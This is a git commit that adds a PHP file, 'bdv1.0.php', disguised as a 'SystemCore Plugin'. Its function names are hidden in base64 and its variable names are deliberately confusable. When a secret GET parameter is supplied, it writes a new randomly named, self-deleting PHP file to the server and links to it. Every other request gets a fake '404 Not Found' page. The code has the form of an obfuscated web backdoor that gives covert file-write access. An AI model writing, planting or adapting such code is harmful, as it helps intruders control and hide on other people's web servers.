cbb83b81c3b96bd25bffdc248b9fc15441949f53
given huang <37971883+givenhyh@users.noreply.github.com>
2020-03-07 03:39:46 +0000

    Create bdv1.0.php

---
+++ bdv1.0.php
@@ -0,0 +1,16 @@
+<?php
+//SystemCore Plugin
+if ($_GET[base64_decode('R0lWRU5OQg==')])
+{
+    $OO0OOOO000 = base64_decode("cmFuZA==")(1000000, 9999999).".php";
+    $O0OO0OOOO0 = base64_decode("Zm9wZW4=")($OO0OOOO000, "w") or die("W D N M D !");
+    $O0OO0OO00O = base64_decode('R0lWRU5OQg==')."<?php @unlink ('".$OO0OOOO000."');?>";
+    $O0OO00OO00 = base64_decode("ZndyaXRl")($O0OO0OOOO0,$O0OO0OO00O);
+    $O0OO0O0O0O = base64_decode("ZmNsb3Nl")($O0OO0OOOO0);
+    echo ('<a href="'.$OO0OOOO000.'">Go</a>');
+}
+else
+{
+    echo (base64_decode("PHRpdGxlPjQwNCBOb3QgRm91bmQ8L3RpdGxlPjQwNA=="));
+}
+?>
